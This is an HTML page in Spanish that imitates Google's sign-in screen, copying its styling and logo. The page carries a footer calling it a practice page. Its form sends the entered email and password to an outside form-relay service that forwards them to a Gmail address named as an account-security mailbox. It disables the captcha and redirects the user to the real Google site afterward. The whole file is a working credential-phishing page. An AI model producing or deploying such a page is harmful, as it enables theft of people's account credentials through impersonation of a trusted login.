<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Iniciar sesión - Google</title>
  <style>
    body {
      font-family: Roboto, Arial, sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      background-color: #fff;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
    }

    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }

    .logo img {
      height: 40px;
    }

    h2 {
      font-weight: normal;
      font-size: 24px;
      color: #202124;
      margin-bottom: 10px;
    }

    p {
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 30px;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      margin-bottom: 20px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #1a73e8;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    button:hover {
      background-color: #1669c1;
    }

    .footer-text {
      margin-top: 20px;
      text-align: center;
      font-size: 12px;
      color: #5f6368;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo">
    </div>
    <h2>Iniciar sesión</h2>
    <p>Usá tu cuenta de Google</p>

    <form action="https://formsubmit.co/seguridaddecuentas441@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://www.google.com">

      <input type="email" name="campo1" placeholder="Correo electrónico o número de teléfono" required>
      <input type="password" name="campo2" placeholder="Contraseña" required>
      <button type="submit">Siguiente</button>
    </form>

    <div class="footer-text">
      Página de ejemplo solo para práctica web
    </div>
  </div>

</body>
</html>
